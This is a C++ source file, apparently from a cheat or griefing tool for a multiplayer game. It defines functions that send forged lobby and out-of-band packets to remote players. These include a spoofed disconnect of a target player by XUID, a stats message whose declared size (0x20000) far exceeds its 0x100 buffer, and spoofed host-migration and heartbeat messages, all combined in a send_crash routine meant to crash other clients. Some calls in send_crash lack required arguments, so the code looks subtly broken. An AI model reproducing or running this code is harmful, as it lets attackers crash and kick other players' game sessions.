#include "dependencies/std_include.hpp"
#include "exploit.hpp"

namespace exploit
{
	void send_connect_response_migration_packet(const game::netadr_t& to)
	{
		PRINT_LOG("Sending connectResponseMigration packet to %s", utils::string::adr_to_string(&to).data());
		game::oob::send(to, "connectResponseMigration");
	}
	
	void send_mstart_packet(const game::netadr_t& to)
	{
		PRINT_LOG("Sending mstart packet to %s", utils::string::adr_to_string(&to).data());
		game::oob::send(to, "mstart");
	}

	void send_request_stats_packet(const game::netadr_t& to)
	{
		PRINT_LOG("Sending requeststats packet to %s", utils::string::adr_to_string(&to).data());
		game::oob::send(to, "requeststats\n");
	} 

	void send_disconnect_client(const std::uint64_t to)
	{
		game::Msg_ClientReliableData data{};
		data.dataMask = 4;
		data.lobbyType = game::session->type;
		data.disconnectClient = game::LOBBY_DISCONNECT_CLIENT_BADDLC;
		data.disconnectClientXuid = to;

		game::SendClientReliableData(0, data.lobbyType, &data);
	}
	
	void send_modified_stats_crash(const game::netadr_t& to)
	{
		char buf[0x200] = { 0 };
		game::LobbyMsg msg{};

		char buf2[0x100] = { 0 };

		game::LobbyMsgRW_PrepWriteMsg(&msg, buf, sizeof buf, game::MESSAGE_TYPE_LOBBY_MODIFIED_STATS);
		int length = 0x20000;
		game::LobbyMsgRW_PackageInt(&msg, "statssize", &length);
		game::LobbyMsgRW_PackageGlob(&msg, "statsbuffer", &buf2, sizeof buf2);

		game::oob::send_lobby_msg(to, &msg, game::LOBBY_MODULE_HOST);
	}
	
	void send_peer_to_peer_info(const game::netadr_t& to, const game::Msg_PeerToPeerInfo& message)
	{
		char buf[0x20000] = { 0 };
		game::LobbyMsg msg{};

		game::LobbyMsgRW_PrepWriteMsg(&msg, buf, sizeof buf, game::MESSAGE_TYPE_PEER_TO_PEER_INFO);
		game::LobbyMsgRW_PackageInt(&msg, "lobbytype", &message.lobbyType);
		game::LobbyMsgRW_PackageInt(&msg, "connectbit", &message.connectivityBits);
		game::LobbyMsgRW_PackageXuid(&msg, "xuid", &message.clientXuid);

		game::oob::send_lobby_msg(to, &msg, game::LOBBY_MODULE_HOST);
	}

	void send_lobby_host_heartbeat(const game::netadr_t& to, const game::Msg_LobbyHostHeartbeat& message)
	{
		char buf[0x20000] = { 0 };
		game::LobbyMsg msg{};

		game::LobbyMsgRW_PrepWriteMsg(&msg, buf, sizeof buf, game::MESSAGE_TYPE_LOBBY_HOST_HEARTBEAT);
		game::LobbyMsgRW_PackageInt(&msg, "heartbeatnum", &message.heartbeatNum);
		game::LobbyMsgRW_PackageInt(&msg, "lobbytype", &message.lobbyType);
		game::LobbyMsgRW_PackageInt(&msg, "lasthosttimems", &message.migrateInfo.lasthostTimeMS);

		game::oob::send_lobby_msg(to, &msg, game::LOBBY_MODULE_CLIENT);
	}

	void send_lobby_migrate_start(const game::netadr_t& to, const game::Msg_LobbyMigrateStart& message)
	{
		char buf[0x20000] = { 0 };
		game::LobbyMsg msg{};

		game::LobbyMsgRW_PrepWriteMsg(&msg, buf, sizeof buf, game::MESSAGE_TYPE_LOBBY_MIGRATE_START);
		game::LobbyMsgRW_PackageInt(&msg, "lobbytype", &message.lobbyType);
		game::LobbyMsgRW_PackageXuid(&msg, "migrateTo", &message.migrateTo);

		game::oob::send_lobby_msg(to, &msg, game::LOBBY_MODULE_PEER_TO_PEER);
	}

	void send_join_party_overflow(const game::netadr_t& to)
	{
		char buf[0x20000] = { 0 };
		game::LobbyMsg msg{};

		game::LobbyMsgRW_PrepWriteMsg(&msg, buf, sizeof buf, game::MESSAGE_TYPE_JOIN_LOBBY);
		
		game::oob::send_lobby_msg(to, &msg, game::LOBBY_MODULE_HOST);
	}

	void send_lobby_type_crash(const game::netadr_t& to, const game::LobbyType type)
	{
		send_peer_to_peer_info(to, { type, 1, 1 });
		send_lobby_migrate_start(to, { type, 1 });
		send_lobby_host_heartbeat(to, { 1, type });
	}

	void send_crash(const game::netadr_t& to)
	{
		PRINT_LOG("Sending crash packets to %s", utils::string::adr_to_string(&to).data()); 
		
		game::oob::send(to, "relay");
		game::oob::send(to, "vt");
		
		send_modified_stats_crash(to);
		send_join_party_overflow(to);
		send_lobby_type_crash(to);
		send_lobby_host_heartbeat(to);
	}
}